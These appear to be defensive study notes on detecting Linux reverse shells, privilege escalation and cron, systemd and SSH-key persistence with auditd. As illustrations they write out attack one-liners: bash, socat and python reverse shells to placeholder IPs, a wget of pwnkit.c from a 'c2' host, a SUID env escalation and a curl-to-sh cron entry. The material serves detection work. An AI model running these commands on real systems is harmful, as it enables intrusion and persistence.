# Linux Threat Detection 3

## Reverse shells — why attackers use them

- Web/exploit-based initial access often gives a **limited, unreliable command channel** (no Ctrl+C, timeouts, truncated output).
- **Reverse shell**: victim initiates outbound connection to attacker, giving a fully interactive shell (colors, job control, TTY).
- Typical examples (on the victim):
    - `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1`
    - `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane`
    - `python3 -c '... s.connect(("10.30.30.30",80)); pty.spawn("bash")'`

## Detecting reverse shells with auditd

- Reverse shells are high-priority alerts (active human adversary).
- Use `ausearch` to find suspicious launcher binaries and walk process tree:
    - `ausearch -i -x socat` → find `socat` invocation details (proctitle, pid, ppid, uid).
    - `ausearch -i --pid <ppid>` or `-ppid <pid>` to build parent/child process tree back to the app (e.g., web app `python3 /opt/...`).
- After detection, list commands executed from spawned shell:
    - `ausearch -i --ppid <reverse-shell-pid> | grep proctitle` to enumerate `id`, `uname -a`, `ls`, etc.

## Privilege Escalation — common patterns

- Initial low-privilege access → attacker hunts for vectors to get root:
    - Unpatched kernels/software → compile/run exploits (e.g., download `pwnkit.c`, `gcc`, execute).
    - Misconfigured SUID binaries (`/bin/env` with SUID): `/bin/env /bin/bash -p`.
    - Exposed SSH keys: `ssh -i ssh-backup-key root@127.0.0.1`.
- Detection approach: focus on **surrounding activity** rather than every specific exploit.

## Detecting Privilege Escalation

- Look for **spikes in discovery** commands from low-privilege accounts (`id`, `pwd`, `ls -la`, `crontab -l`, `ps aux | egrep edr|splunk|elastic`).
- Watch for **downloads/compilation** in temp dirs: `wget http://c2/pwnkit.c -O /tmp/pwnkit.c`, `gcc /tmp/pwnkit.c -o /tmp/pwnkit`, `chmod +x /tmp/pwnkit`, `/tmp/pwnkit`.
- Confirm success by comparing effective UID before/after:
    - `ausearch -i -x pwnkit` to find pwnkit exec, check `uid=serviceuser`, then `ausearch -i --ppid <pid>` to see spawned `uid=root`.
- Key indicator: same attack process spawning a child with **uid=root** and subsequent root commands (`whoami`, `tar /root`, `scp ...`).

## Startup Persistence (survives reboots)

- **Cron**:
    - Per-user crons (`/var/spool/cron/<user>`), system cron files (`/etc/cron.d/*`, `/etc/crontab`).
    - Examples: `@reboot nohup /home/<user>/.hidden/malware > /dev/null 2>&1 &` or periodic re-downloads `/10 * * * root (curl ...) | sh`.
- **systemd services**:
    - Add `.service` files to `/lib/systemd/system` or `/etc/systemd/system` with `ExecStart=/usr/bin/<malware>`.
    - Adversaries commonly name services to appear legitimate.

## Detecting startup persistence

- Monitor file changes with auditd on cron & systemd paths:
    - Paths to watch: `/etc/crontab`, `/etc/cron.d/*`, `/var/spool/cron/*`, `/lib/systemd/system/*`, `/etc/systemd/system/*`.
- Monitor process activity that edits/creates these files:
    - `ausearch -i -f /etc/systemd` to detect editors creating `malicious.service`.
    - `ausearch -i -x crontab` to find `crontab -e` executions.
- Look for unexpected `systemctl enable/start` operations and file writes with `O_CREAT` flags in audit entries.

## Account persistence

- **New user accounts**:
    - Detect via auth logs: `useradd` / `usermod` entries in `/var/log/auth.log` (new user, group add to `sudo`).
    - Reconstruct entire process tree with auditd (start from the useradd process).
- **Backdoored SSH keys**:
    - Authorized keys live at `~/.ssh/authorized_keys`. Changes are stealthy (e.g., `echo key >> file` is a shell builtin and may appear as `bash`).
    - Monitor the file itself with auditd: `ausearch -i -f /home/*/.ssh/authorized_keys` to capture write events and the process context.
- **Application-layer persistence**:
    - Webshells, plugin backdoors, admin account compromise — often invisible to system-level logs/auditd.
    - If persistence returns after cleanup, investigate application data (DB, uploads, plugins) and web app admin actions.

## Targeted attacks & operational risk

- Linux servers commonly host critical services (web, mail, hypervisors). A single compromised Linux host can pivot to many Windows VMs (hypervisor compromise = high impact).
- State-level actors use systemd/cron and stealthy account persistence for long-term espionage.
- Ransomware targeting Linux (including hypervisors) is increasing—protect hypervisors and central Linux infrastructure.

## Practical outcomes & detection priorities (quick checklist)

- **High priority detections**
    - Outbound reverse shell binaries (socat, netcat variants, unusual `bash`/`python` network usage) and their process trees.
    - Exploit toolchain activity in `/tmp` (downloads, compile, chmod, execute).
    - Sudden UID change to `root` in an attack's process tree.
    - Writes/creates to `/etc/systemd/system/*`, `/lib/systemd/system/*`, `/etc/cron.d/*`, `/var/spool/cron/*`.
    - Writes to `~/.ssh/authorized_keys` (audit file writes).
    - New `useradd`/`usermod` entries adding accounts to sudoers.
- **Secondary checks**
    - Recurrent scheduled downloads (cron entries with curl/wget).
    - Files or services named to mimic legitimate system components (`syslogd`, `cloud-online`).
    - Application-layer persistence (webshells/plugins) when system artifacts are absent.
